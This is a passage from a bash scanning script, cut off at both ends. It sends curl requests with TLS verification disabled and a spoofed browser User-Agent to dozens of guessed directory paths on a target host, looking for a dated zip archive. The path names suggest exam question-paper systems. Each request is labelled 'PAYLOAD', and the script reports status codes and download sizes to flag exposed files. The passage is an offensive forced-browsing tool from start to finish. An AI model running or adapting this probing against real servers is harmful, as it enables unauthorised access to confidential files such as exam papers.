" "${target}Q_P_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
